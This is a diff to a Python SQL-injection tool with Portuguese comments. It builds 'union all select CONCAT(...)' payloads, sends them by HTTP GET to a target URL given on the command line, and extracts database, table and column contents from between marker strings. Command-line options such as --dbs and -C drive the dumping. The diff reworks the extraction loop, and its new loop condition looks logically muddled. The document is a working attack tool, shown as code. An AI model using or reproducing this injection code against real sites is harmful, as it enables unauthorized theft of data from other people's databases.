@@ -12,16 +12,17 @@ print()
 argv = " ".join(argv)
 argv = argv.replace(" ,", ",").replace(", ", ",")
 argv = argv.split()
-
 #função que puxa as infos
-def sqli(pull_type: str, diretory: str, extra: str="", column=False):
-    infos = ['']
+def sqli(pull_type: str, diretory: str, extra: str="", column=False, C=False):
+    infos = [' ']
     new = []
-    for i in range(n):
+    r = ''
+    while not infos == "\n<empty>" and not C or r.find("X12TIKTEN0XX0TIKTEN12X"):
+        r = ''
         algr = []
         for j in range(n):
-            if column: algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{i}x'))")
-            else: algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, UPPER('x0tikten{i}x'))")
+            if column: algr.append(f"CONCAT(UPPER('x12tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten12x'))")
+            else: algr.append(f"CONCAT(UPPER('x12tikten0x'), {pull_type}, UPPER('x0tikten12x'))")
         algr = ",".join(algr)
         for j in infos:
             if j.split() != [] and column: new.append(f"{pull_type} != '{j.split()[0]}'")
@@ -30,12 +31,13 @@ def sqli(pull_type: str, diretory: str, extra: str="", column=False):
         r = requests.get(f"{argv[1]} union all select {algr} from {diretory} where {new} {extra} --")
         r = r.text
         try:
-            co = r.index(f"X{i}TIKTEN0X")+len(f"X{i}TIKTEN0X")
-            fi = r.index(f"X0TIKTEN{i}X")
+            co = r.index(f"X12TIKTEN0X")+len(f"X12TIKTEN0X")
+            fi = r.index(f"X0TIKTEN12X")
         except:
             break
         infos.append(r[co:fi])
         new = []
+        if infos[0] == ' ': del infos[0]
     infos = "\n".join(set(infos))
     if infos.replace(" ", "") == "":
         infos = "\n<empty>"
@@ -121,7 +123,7 @@ elif "-C" in argv:
     columns = pullt("-C", "-C")
     pull_columns()
     for i in columns.split(","):
-        res = sqli(i, f"{db}.{table}")
+        res = sqli(i, f"{db}.{table}", C=True)
         print(res)
 
 elif "--dbs" in argv:
